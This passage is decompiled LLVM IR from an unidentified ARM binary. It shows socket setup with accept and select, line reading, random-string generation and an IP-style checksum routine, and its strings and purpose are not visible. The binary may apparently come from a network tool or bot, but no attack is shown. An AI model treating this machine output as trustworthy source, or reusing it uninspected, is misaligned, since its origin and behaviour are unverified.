  %v0_864c = call i32 @function_f2e0()
  %v2_8654 = add i32 %v1_8664, %v0_864c
  %v3_865c = inttoptr i32 %v2_8654 to i8*
  store i8 0, i8* %v3_865c, align 1
  br label %dec_label_pc_8660

dec_label_pc_8660:                                ; preds = %dec_label_pc_8628, %dec_label_pc_8640
  store i32 %arg1, i32* @r0, align 4
  %v0_866c = call i32 @function_f2e0()
  %v2_8674 = add i32 %v1_8664, %v0_866c
  %v1_8678 = inttoptr i32 %v2_8674 to i8*
  %v2_8678 = load i8, i8* %v1_8678, align 1
  %v7_867c = icmp eq i8 %v2_8678, 13
  br i1 %v7_867c, label %dec_label_pc_8640, label %dec_label_pc_8684

dec_label_pc_8684:                                ; preds = %dec_label_pc_8660
  store i32 %arg1, i32* @r0, align 4
  %v0_8690 = call i32 @function_f2e0()
  %v2_8698 = add i32 %v1_8664, %v0_8690
  %v1_869c = inttoptr i32 %v2_8698 to i8*
  %v2_869c = load i8, i8* %v1_869c, align 1
  %v7_86a0 = icmp eq i8 %v2_869c, 10
  br i1 %v7_86a0, label %dec_label_pc_8640, label %dec_label_pc_86a8

dec_label_pc_86a8:                                ; preds = %dec_label_pc_8684
  ret i32 %v0_8690

; uselistorder directives
  uselistorder i32 %v1_8664, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8660, { 1, 0 }
}

define i32 @function_86b4() local_unnamed_addr {
dec_label_pc_86b4:
  %stack_var_-1068 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_86b8 = load i32, i32* @r4, align 4
  %v6_86b8 = load i32, i32* @fp, align 4
  store i32 34496, i32* %stack_var_-4, align 4
  %v2_86bc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_86bc, i32* @fp, align 4
  %v0_86c8 = call i32 @function_10c88()
  %v2_86e0 = srem i32 %v0_86c8, 5
  %v1_8704 = add nsw i32 %v2_86e0, 4
  %v1_8710 = add nsw i32 %v2_86e0, 5
  %v1_8718 = call i32 @function_fd60(i32 %v1_8710)
  store i32 %v1_8710, i32* @r2, align 4
  %v2_8738 = inttoptr i32 %v1_8718 to i8*
  %v3_8738 = call i32 @function_f240(i8* %v2_8738, i32 0)
  store i32 ptrtoint ([16 x i8]* @global_var_18550.23 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_18560.25 to i32), i32* @r1, align 4
  %v3_8744 = call i32 @function_cfd8(i32 ptrtoint ([16 x i8]* @global_var_18550.23 to i32), i32 ptrtoint ([2 x i8]* @global_var_18560.25 to i32))
  %v2_8754 = icmp eq i32 %v3_8744, 0
  br i1 %v2_8754, label %dec_label_pc_87dc.preheader, label %dec_label_pc_87f0

dec_label_pc_87dc.preheader:                      ; preds = %dec_label_pc_86b4
  %v2_87e424 = sub nsw i32 -4, %v2_86e0
  %v6_87e426 = and i32 %v2_87e424, %v1_8704
  %v7_87e427 = icmp slt i32 %v6_87e426, 0
  %v8_87e428 = icmp slt i32 %v2_87e424, 0
  %v2_87e830 = xor i1 %v8_87e428, %v7_87e427
  br i1 %v2_87e830, label %dec_label_pc_8768, label %dec_label_pc_891c

dec_label_pc_8768:                                ; preds = %dec_label_pc_87dc.preheader, %dec_label_pc_8768
  %storemerge331 = phi i32 [ %v1_87d4, %dec_label_pc_8768 ], [ 0, %dec_label_pc_87dc.preheader ]
  %v2_8774 = add i32 %storemerge331, %v1_8718
  store i32 %v2_8774, i32* @r4, align 4
  %v0_8778 = call i32 @function_10c88()
  %v2_8790 = srem i32 %v0_8778, 26
  %fold = add nsw i32 %v2_8790, 65
  %v1_87cc = trunc i32 %fold to i8
  %v2_87cc = load i32, i32* @r4, align 4
  %v3_87cc = inttoptr i32 %v2_87cc to i8*
  store i8 %v1_87cc, i8* %v3_87cc, align 1
  %v1_87d4 = add i32 %storemerge331, 1
  %v2_87e4 = sub i32 %v1_87d4, %v1_8704
  %v4_87e4 = xor i32 %v1_87d4, %v1_8704
  %v5_87e4 = xor i32 %v2_87e4, %v1_87d4
  %v6_87e4 = and i32 %v5_87e4, %v4_87e4
  %v7_87e4 = icmp slt i32 %v6_87e4, 0
  %v8_87e4 = icmp slt i32 %v2_87e4, 0
  %v2_87e8 = xor i1 %v8_87e4, %v7_87e4
  br i1 %v2_87e8, label %dec_label_pc_8768, label %dec_label_pc_891c

dec_label_pc_87f0:                                ; preds = %dec_label_pc_86b4
  %v0_87f0 = call i32 @function_10c88()
  store i32 %v0_87f0, i32* @r4, align 4
  %v0_87f8 = call i32 @function_10c88()
  %v1_8800 = load i32, i32* @r4, align 4
  %v2_8800 = mul i32 %v1_8800, %v0_87f8
  %v2_8818 = sdiv i32 %v2_8800, 12039
  %tmp23 = mul i32 %v2_8818, -45402
  %v2_8854 = add i32 %tmp23, %v2_8800
  %v1_8860 = add i32 %v2_8854, 1
  %v2_887c = ptrtoint i32* %stack_var_-1068 to i32
  br label %dec_label_pc_889c

dec_label_pc_8874:                                ; preds = %dec_label_pc_889c
  %v3_888c = call i32 @function_ea64(i32 %v2_887c, i32 1024, i32 %v3_8744)
  %v1_8894 = add i32 %storemerge2, 1
  br label %dec_label_pc_889c

dec_label_pc_889c:                                ; preds = %dec_label_pc_87f0, %dec_label_pc_8874
  %storemerge2 = phi i32 [ 0, %dec_label_pc_87f0 ], [ %v1_8894, %dec_label_pc_8874 ]
  %v2_88a4 = sub i32 %storemerge2, %v1_8860
  %v4_88a4 = xor i32 %storemerge2, %v1_8860
  %v5_88a4 = xor i32 %v2_88a4, %storemerge2
  %v6_88a4 = and i32 %v5_88a4, %v4_88a4
  %v7_88a4 = icmp slt i32 %v6_88a4, 0
  %v8_88a4 = icmp slt i32 %v2_88a4, 0
  %v2_88a8 = xor i1 %v8_88a4, %v7_88a4
  br i1 %v2_88a8, label %dec_label_pc_8874, label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_889c
  store i32 1024, i32* @r2, align 4
  %v2_88c4 = bitcast i32* %stack_var_-1068 to i8*
  %v3_88c4 = call i32 @function_f240(i8* %v2_88c4, i32 0)
  %v3_88e0 = call i32 @function_ea64(i32 %v2_887c, i32 1024, i32 %v3_8744)
  %v1_88f4 = call i32 @function_8628(i32 %v2_887c)
  store i32 %v1_8704, i32* @r2, align 4
  store i32 %v2_887c, i32* @r3, align 4
  store i32 %v1_8718, i32* @r0, align 4
  store i32 %v2_887c, i32* @r1, align 4
  %v0_8910 = call i32 @function_f350()
  %v1_8918 = inttoptr i32 %v3_8744 to i16*
  %v2_8918 = call i32 @function_ce24(i16* %v1_8918)
  br label %dec_label_pc_891c

dec_label_pc_891c:                                ; preds = %dec_label_pc_87dc.preheader, %dec_label_pc_8768, %dec_label_pc_88ac
  store i32 %v3_86b8, i32* @r4, align 4
  store i32 %v6_86b8, i32* @fp, align 4
  ret i32 %v1_8718

; uselistorder directives
  uselistorder i32 %v2_88a4, { 1, 0 }
  uselistorder i32 %storemerge2, { 0, 1, 3, 2 }
  uselistorder i32 %v2_8800, { 1, 0 }
  uselistorder i32 %v2_87e4, { 1, 0 }
  uselistorder i32 %v1_87d4, { 3, 2, 1, 0 }
  uselistorder i32 %v2_87e424, { 1, 0 }
  uselistorder i32 %v1_8718, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8704, { 2, 1, 3, 0 }
  uselistorder i32 %v2_86e0, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_18560.25 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_891c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_889c, { 1, 0 }
  uselistorder label %dec_label_pc_8768, { 1, 0 }
}

define i32 @function_8930(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_8930:
  %tmp = ptrtoint i32* %arg4 to i32
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8930 = load i1, i1* @cpsr_v, align 1
  br i1 %v0_8930, label %bb, label %bb34

bb:                                               ; preds = %dec_label_pc_8930
  %v1_8930 = load i32, i32* @r6, align 4
  %v2_8930 = trunc i32 %v1_8930 to i8
  %v4_8930 = inttoptr i32 %v1_8930 to i8*
  store i8 %v2_8930, i8* %v4_8930, align 1
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_8930, %bb
  %v0_8934 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8934, label %bb35, label %.thread

bb35:                                             ; preds = %bb34
  %v3_8938 = udiv i32 %arg1, 1024
  %v4_8938 = mul i32 %arg1, 4194304
  %v5_8938 = or i32 %v3_8938, %v4_8938
  %v8_8938 = and i32 %v5_8938, %arg2
  store i32 %v8_8938, i32* @r8, align 4
  br label %.thread

.thread:                                          ; preds = %bb34, %bb35
  %v0_8940 = load i1, i1* @cpsr_n, align 1
  %v1_8940 = load i1, i1* @cpsr_v, align 1
  %v2_8940 = xor i1 %v0_8940, %v1_8940
  br i1 %v2_8940, label %bb36, label %bb37

bb36:                                             ; preds = %.thread
  store i32 %arg1, i32* %arg4, align 4
  %v6_8940 = add i32 %tmp, 4
  %v7_8940 = inttoptr i32 %v6_8940 to i32*
  store i32 %arg2, i32* %v7_8940, align 4
  %v9_8940 = add i32 %tmp, 8
  %v10_8940 = inttoptr i32 %v9_8940 to i32*
  store i32 %tmp, i32* %v10_8940, align 4
  %v12_8940 = add i32 %tmp, 12
  %v13_8940 = inttoptr i32 %v12_8940 to i32*
  %v14_8940 = load i32, i32* @r4, align 4
  store i32 %v14_8940, i32* %v13_8940, align 4
  %v15_8940 = add i32 %tmp, 16
  %v16_8940 = inttoptr i32 %v15_8940 to i32*
  %v17_8940 = load i32, i32* @r5, align 4
  store i32 %v17_8940, i32* %v16_8940, align 4
  %v18_8940 = add i32 %tmp, 20
  %v19_8940 = inttoptr i32 %v18_8940 to i32*
  %v20_8940 = load i32, i32* @r6, align 4
  store i32 %v20_8940, i32* %v19_8940, align 4
  %v21_8940 = add i32 %tmp, 24
  %v22_8940 = inttoptr i32 %v21_8940 to i32*
  %v23_8940 = load i32, i32* @r8, align 4
  store i32 %v23_8940, i32* %v22_8940, align 4
  %v24_8940 = add i32 %tmp, 28
  %v25_8940 = inttoptr i32 %v24_8940 to i32*
  %v26_8940 = load i32, i32* @ip, align 4
  store i32 %v26_8940, i32* %v25_8940, align 4
  %v27_8940 = add i32 %tmp, 32
  %v28_8940 = inttoptr i32 %v27_8940 to i32*
  %v29_8940 = load i32, i32* @lr, align 4
  store i32 %v29_8940, i32* %v28_8940, align 4
  br label %bb37

bb37:                                             ; preds = %.thread, %bb36
  %v3_8948 = load i32, i32* @fp, align 4
  store i32 %v3_8948, i32* %stack_var_-16, align 4
  store i32 35152, i32* %stack_var_-4, align 4
  %v13_8948 = ptrtoint i32* %stack_var_-16 to i32
  %v2_894c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_894c, i32* @fp, align 4
  %v3_8960 = call i32 @function_fc94(i32 2, i32 1, i32 0)
  %v7_8970 = icmp eq i32 %v3_8960, -1
  br i1 %v7_8970, label %dec_label_pc_8d00, label %dec_label_pc_8978

dec_label_pc_8978:                                ; preds = %bb37
  store i32 2, i32* %stack_var_-60, align 4
  %v1_8984 = call i32 @function_f8a4(i32 113)
  store i32 8, i32* @r2, align 4
  %v2_89ac = bitcast i32* %stack_var_-52 to i8*
  %v3_89ac = call i32 @function_f240(i8* %v2_89ac, i32 0)
  %v2_89b0 = ptrtoint i32* %stack_var_-60 to i32
  %v4_89c0 = call i32 @function_fb34(i32 %v3_8960, i32 %v2_89b0, i32 16, i32 %v2_89b0)
  %v7_89c8 = icmp eq i32 %v4_89c0, -1
  br i1 %v7_89c8, label %dec_label_pc_8d00, label %dec_label_pc_89d0

dec_label_pc_89d0:                                ; preds = %dec_label_pc_8978
  %v2_89d8 = call i32 @function_fba4(i32 %v3_8960, i32 1)
  %v7_89e0 = icmp eq i32 %v2_89d8, -1
  br i1 %v7_89e0, label %dec_label_pc_8d00, label %dec_label_pc_89e8

dec_label_pc_89e8:                                ; preds = %dec_label_pc_89d0
  %v1_89e8 = call i32 @function_cc24(i32 %v2_89d8)
  %v2_89f0 = icmp eq i32 %v1_89e8, 0
  br i1 %v2_89f0, label %dec_label_pc_8d00, label %dec_label_pc_89f8

dec_label_pc_89f8:                                ; preds = %dec_label_pc_89e8
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8a00 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8a04 = ptrtoint i32* %stack_var_-44 to i32
  %v5_8a10 = call i32 @function_fafc(i32 %v3_8960, i32 %v2_8a00, i32 %v2_8a04, i32 %v2_8a00, i32 16)
  %v2_8a20 = add i32 %v5_8a10, 1
  %v3_8a20 = icmp eq i32 %v5_8a10, -1
  br i1 %v3_8a20, label %dec_label_pc_8a28, label %dec_label_pc_8a30.preheader

dec_label_pc_8a28:                                ; preds = %dec_label_pc_89f8
  %v1_8a2c = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_8a30.preheader

dec_label_pc_8a30.preheader:                      ; preds = %dec_label_pc_8a28, %dec_label_pc_89f8
  %v2_8a38 = ptrtoint i32* %stack_var_-1236 to i32
  %v3_8a78 = udiv i32 %v5_8a10, 32
  %v3_8a8c = mul nuw nsw i32 %v3_8a78, 4
  %v2_8a94 = add i32 %v3_8a8c, %v13_8948
  %v1_8aa4 = urem i32 %v5_8a10, 32
  %v6_8aac = shl i32 1, %v1_8aa4
  %v2_8afc = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8b48 = add i32 %v2_8a94, -1220
  %v1_8b4c = inttoptr i32 %v2_8b48 to i32*
  br label %dec_label_pc_8a4c.lr.ph

dec_label_pc_8a4c.lr.ph:                          ; preds = %dec_label_pc_8b2c, %dec_label_pc_8a30.preheader
  br label %dec_label_pc_8a4c

dec_label_pc_8a4c:                                ; preds = %dec_label_pc_8a4c.lr.ph, %dec_label_pc_8a4c
  %storemerge26 = phi i32 [ 0, %dec_label_pc_8a4c.lr.ph ], [ %v1_8a60, %dec_label_pc_8a4c ]
  %v5_8a58 = mul nuw nsw i32 %storemerge26, 4
  %v6_8a58 = add i32 %v5_8a58, %v2_8a38
  %v7_8a58 = inttoptr i32 %v6_8a58 to i32*
  store i32 0, i32* %v7_8a58, align 4
  %v1_8a60 = add nuw nsw i32 %storemerge26, 1
  %tmp38 = icmp ult i32 %v1_8a60, 32
  br i1 %tmp38, label %dec_label_pc_8a4c, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a4c
  %v2_8a9c = load i32, i32* %v1_8b4c, align 4
  %v2_8ab0 = or i32 %v2_8a9c, %v6_8aac
  store i32 %v2_8ab0, i32* %v1_8b4c, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8b14 = call i32 @function_cc74(i32 %v2_8a20, i32 %v2_8a38, i32 0, i32 0, i32 %v2_8afc)
  %v1_8b1c = icmp slt i32 %v5_8b14, 0
  br i1 %v1_8b1c, label %dec_label_pc_8b24, label %dec_label_pc_8b2c

dec_label_pc_8b24:                                ; preds = %dec_label_pc_8a74
  %v1_8b28 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_8b2c

dec_label_pc_8b2c:                                ; preds = %dec_label_pc_8a74, %dec_label_pc_8b24
  %v2_8b4c = load i32, i32* %v1_8b4c, align 4
  %v6_8b581 = lshr i32 %v2_8b4c, %v1_8aa4
  %v1_8b60 = urem i32 %v6_8b581, 2
  %v2_8b64 = icmp eq i32 %v1_8b60, 0
  br i1 %v2_8b64, label %dec_label_pc_8a4c.lr.ph, label %dec_label_pc_8b70

dec_label_pc_8b70:                                ; preds = %dec_label_pc_8b2c
  %v2_8b78 = ptrtoint i32* %stack_var_-1100 to i32
  %v4_8b8c = call i32 @function_fbd8(i32 %v5_8a10, i32 %v2_8b78, i32 1024, i32 0)
  %tmp39 = icmp slt i32 %v4_8b8c, 1
  br i1 %tmp39, label %dec_label_pc_8bb0, label %dec_label_pc_8ba4

dec_label_pc_8ba4:                                ; preds = %dec_label_pc_8b70
  %v7_8bac = icmp slt i32 %v4_8b8c, 20
  br i1 %v7_8bac, label %dec_label_pc_8bb8, label %dec_label_pc_8bb0

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba4, %dec_label_pc_8b70
  %v1_8bb4 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_8bb8

dec_label_pc_8bb8:                                ; preds = %dec_label_pc_8ba4, %dec_label_pc_8bb0
  %v2_8bc8 = add i32 %v13_8948, -1084
  %v2_8bcc = add i32 %v2_8bc8, %v4_8b8c
  %v3_8bd4 = inttoptr i32 %v2_8bcc to i8*
  store i8 0, i8* %v3_8bd4, align 1
  %v1_8bdc = add i32 %v13_8948, -1
  %v2_8bec = add i32 %v1_8bdc, %v4_8b8c
  %v2_8bf0 = add i32 %v2_8bec, -1084
  %v1_8bf4 = inttoptr i32 %v2_8bf0 to i8*
  %v2_8bf4 = load i8, i8* %v1_8bf4, align 1
  %v7_8bf8 = icmp eq i8 %v2_8bf4, 10
  br i1 %v7_8bf8, label %dec_label_pc_8c28, label %dec_label_pc_8c00

dec_label_pc_8c00:                                ; preds = %dec_label_pc_8bb8
  %v2_8c1c = load i8, i8* %v1_8bf4, align 1
  %v7_8c20 = icmp eq i8 %v2_8c1c, 13
  br i1 %v7_8c20, label %dec_label_pc_8c28, label %dec_label_pc_8c4c

dec_label_pc_8c28:                                ; preds = %dec_label_pc_8c00, %dec_label_pc_8bb8
  store i8 0, i8* %v1_8bf4, align 1
  br label %dec_label_pc_8c4c

dec_label_pc_8c4c:                                ; preds = %dec_label_pc_8c00, %dec_label_pc_8c28
  %v1_8c50 = add i32 %v13_8948, -2
  %v2_8c60 = add i32 %v1_8c50, %v4_8b8c
  %v2_8c64 = add i32 %v2_8c60, -1084
  %v1_8c68 = inttoptr i32 %v2_8c64 to i8*
  %v2_8c68 = load i8, i8* %v1_8c68, align 1
  %v7_8c6c = icmp eq i8 %v2_8c68, 10
  br i1 %v7_8c6c, label %dec_label_pc_8c9c, label %dec_label_pc_8c74

dec_label_pc_8c74:                                ; preds = %dec_label_pc_8c4c
  %v2_8c90 = load i8, i8* %v1_8c68, align 1
  %v7_8c94 = icmp eq i8 %v2_8c90, 13
  br i1 %v7_8c94, label %dec_label_pc_8c9c, label %dec_label_pc_8cc0

dec_label_pc_8c9c:                                ; preds = %dec_label_pc_8c74, %dec_label_pc_8c4c
  store i8 0, i8* %v1_8c68, align 1
  br label %dec_label_pc_8cc0

dec_label_pc_8cc0:                                ; preds = %dec_label_pc_8c74, %dec_label_pc_8c9c
  store i32 %v2_8b78, i32* @r2, align 4
  %v3_8ce4 = call i32 @function_8398(i32 %v5_8a10, i32 ptrtoint ([25 x i8]* @global_var_18564.31 to i32))
  %v1_8cec = call i32 @function_cda4(i32 %v5_8a10)
  %v1_8cf4 = call i32 @function_cda4(i32 %v3_8960)
  %v1_8cfc = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_8d00

dec_label_pc_8d00:                                ; preds = %dec_label_pc_89e8, %dec_label_pc_89d0, %dec_label_pc_8978, %bb37, %dec_label_pc_8cc0
  %v1_8d08 = phi i32 [ 0, %dec_label_pc_89e8 ], [ %v2_89d8, %dec_label_pc_89d0 ], [ %v4_89c0, %dec_label_pc_8978 ], [ %v3_8960, %bb37 ], [ %v1_8cfc, %dec_label_pc_8cc0 ]
  ret i32 %v1_8d08

; uselistorder directives
  uselistorder i8* %v1_8c68, { 1, 0, 2 }
  uselistorder i8* %v1_8bf4, { 1, 0, 2 }
  uselistorder i32 %storemerge26, { 1, 0 }
  uselistorder i32* %v1_8b4c, { 2, 0, 1 }
  uselistorder i32 %v1_8aa4, { 1, 0 }
  uselistorder i32 %v2_8a38, { 1, 0 }
  uselistorder i32 %v5_8a10, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v2_89d8, { 1, 2, 0 }
  uselistorder i32 %v4_89c0, { 1, 0 }
  uselistorder i32 %v3_8960, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v13_8948, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 %tmp, { 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d00, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8cc0, { 1, 0 }
  uselistorder label %dec_label_pc_8c4c, { 1, 0 }
  uselistorder label %dec_label_pc_8bb8, { 1, 0 }
  uselistorder label %dec_label_pc_8b2c, { 1, 0 }
  uselistorder label %dec_label_pc_8a4c, { 1, 0 }
  uselistorder label %bb37, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
}

define i32 @function_8d14(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8d14:
  %stack_var_-4 = alloca i32, align 4
  store i32 36128, i32* %stack_var_-4, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  %v2_8d30 = icmp eq i32 %arg2, 0
  br i1 %v2_8d30, label %dec_label_pc_8d38, label %dec_label_pc_8d44

dec_label_pc_8d38:                                ; preds = %dec_label_pc_8d14
  br label %dec_label_pc_8d80

dec_label_pc_8d44:                                ; preds = %dec_label_pc_8d14
  %v7_8d48 = icmp eq i32 %arg2, 1
  br i1 %v7_8d48, label %dec_label_pc_8d50, label %dec_label_pc_8d5c

dec_label_pc_8d50:                                ; preds = %dec_label_pc_8d44
  br label %dec_label_pc_8d80

dec_label_pc_8d5c:                                ; preds = %dec_label_pc_8d44
  %v1_8d48 = add i32 %arg2, -1
  %v2_8d6c = call i32 @function_8d14(i32 %arg1, i32 %v1_8d48)
  %v2_8d78 = mul i32 %v2_8d6c, %arg1
  br label %dec_label_pc_8d80

dec_label_pc_8d80:                                ; preds = %dec_label_pc_8d50, %dec_label_pc_8d38, %dec_label_pc_8d5c
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8d38 ], [ %arg1, %dec_label_pc_8d50 ], [ %v2_8d78, %dec_label_pc_8d5c ]
  ret i32 %stack_var_-28.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d80, { 2, 0, 1 }
}

define i32 @function_8d94(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8d94:
  %stack_var_0 = alloca i32, align 4
  %v1_8d94 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8d94, i32* @ip, align 4
  %v8_8e0410 = icmp sgt i32 %arg2, 1
  br i1 %v8_8e0410, label %dec_label_pc_8dd0, label %dec_label_pc_8e08

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8d94, %dec_label_pc_8dd0
  %stack_var_-44.013 = phi i32 [ %v1_8df4, %dec_label_pc_8dd0 ], [ %arg2, %dec_label_pc_8d94 ]
  %stack_var_-36.012 = phi i32 [ %v2_8ddc, %dec_label_pc_8dd0 ], [ 0, %dec_label_pc_8d94 ]
  %stack_var_-40.011 = phi i16* [ %v5_8dec, %dec_label_pc_8dd0 ], [ %arg1, %dec_label_pc_8d94 ]
  %v4_8dd0 = ptrtoint i16* %stack_var_-40.011 to i32
  %v2_8dd4 = load i16, i16* %stack_var_-40.011, align 2
  %v3_8dd4 = zext i16 %v2_8dd4 to i32
  %v2_8ddc = add i32 %v3_8dd4, %stack_var_-36.012
  %v1_8de8 = add i32 %v4_8dd0, 2
  %v5_8dec = inttoptr i32 %v1_8de8 to i16*
  %v1_8df4 = add nsw i32 %stack_var_-44.013, -2
  %v8_8e04 = icmp sgt i32 %v1_8df4, 1
  br i1 %v8_8e04, label %dec_label_pc_8dd0, label %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge

dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge:    ; preds = %dec_label_pc_8dd0
  %v7_8e00.le = icmp eq i32 %v1_8df4, 1
  br i1 %v7_8e00.le, label %dec_label_pc_8e14, label %dec_label_pc_8e34

dec_label_pc_8e08:                                ; preds = %dec_label_pc_8d94
  %v7_8e009 = icmp eq i32 %arg2, 1
  br i1 %v7_8e009, label %dec_label_pc_8e14, label %dec_label_pc_8e34

dec_label_pc_8e14:                                ; preds = %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge, %dec_label_pc_8e08
  %stack_var_-36.0.lcssa29 = phi i32 [ %v2_8ddc, %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge ], [ 0, %dec_label_pc_8e08 ]
  %stack_var_-40.0.lcssa28 = phi i16* [ %v5_8dec, %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge ], [ %arg1, %dec_label_pc_8e08 ]
  %v1_8e1c = bitcast i16* %stack_var_-40.0.lcssa28 to i8*
  %v2_8e1c = load i8, i8* %v1_8e1c, align 1
  %v3_8e1c = zext i8 %v2_8e1c to i32
  %v2_8e2c = add i32 %v3_8e1c, %stack_var_-36.0.lcssa29
  br label %dec_label_pc_8e34

dec_label_pc_8e34:                                ; preds = %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge, %dec_label_pc_8e08, %dec_label_pc_8e14
  %stack_var_-36.1 = phi i32 [ %v2_8e2c, %dec_label_pc_8e14 ], [ 0, %dec_label_pc_8e08 ], [ %v2_8ddc, %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge ]
  %v3_8e38 = sdiv i32 %stack_var_-36.1, 65536
  %v3_8e44 = urem i32 %stack_var_-36.1, 65536
  %v2_8e48 = add nsw i32 %v3_8e38, %v3_8e44
  %v3_8e54 = sdiv i32 %v2_8e48, 65536
  %v2_8e5c = add nsw i32 %v3_8e54, %v2_8e48
  %v1_8e70 = mul i32 %v2_8e5c, 65536
  %sext = xor i32 %v1_8e70, -65536
  %v4_8e80 = sdiv i32 %sext, 65536
  ret i32 %v4_8e80

; uselistorder directives
  uselistorder i32 %v2_8e48, { 1, 0 }
  uselistorder i32 %stack_var_-36.1, { 1, 0 }
  uselistorder i32 %v1_8df4, { 0, 2, 1 }
  uselistorder i32 %v2_8ddc, { 1, 0, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8e34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8e14, { 1, 0 }
  uselistorder label %dec_label_pc_8dd0, { 1, 0 }
}

define i32 @function_8e94(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8e94:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-5224 = alloca i32, align 4
  %stack_var_-5204 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36512, i32* %stack_var_-4, align 4
  %v2_8e9c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e9c, i32* @fp, align 4
  %v2_8eb0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8eb0, i32* @lr, align 4
  store i32 %arg4, i32* %stack_var_-5224, align 4
  store i32 %v2_8eb0, i32* %r1.global-to-local, align 4
  %v1_8ef8 = call i32 @function_8400(i32 %arg2)
  %v2_8f00 = icmp eq i32 %v1_8ef8, 0
  br i1 %v2_8f00, label %dec_label_pc_8f08, label %dec_label_pc_95dc

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8e94
  %v8_8f1c = icmp sgt i32 %arg3, 1
  br i1 %v8_8f1c, label %dec_label_pc_8f50, label %dec_label_pc_8f20

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8f08
  store i32 ptrtoint ([33 x i8]* @global_var_18580.33 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_8eb0, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8f44 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_18580.33 to i32))
  %v1_8f4c = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_8f50

dec_label_pc_8f50:                                ; preds = %dec_label_pc_8f08, %dec_label_pc_8f20
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_8f5c = call i32 @function_fc94(i32 2, i32 1, i32 0)
  %v3_8f6c = icmp eq i32 %v3_8f5c, -1
  br i1 %v3_8f6c, label %dec_label_pc_8f74, label %dec_label_pc_8fa4

dec_label_pc_8f74:                                ; preds = %dec_label_pc_8f50
  store i32 ptrtoint ([37 x i8]* @global_var_185a4.35 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8f98 = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_185a4.35 to i32))
  %v1_8fa0 = call i32 @function_1148c(i32 0)
  br label %dec_label_pc_8fa4

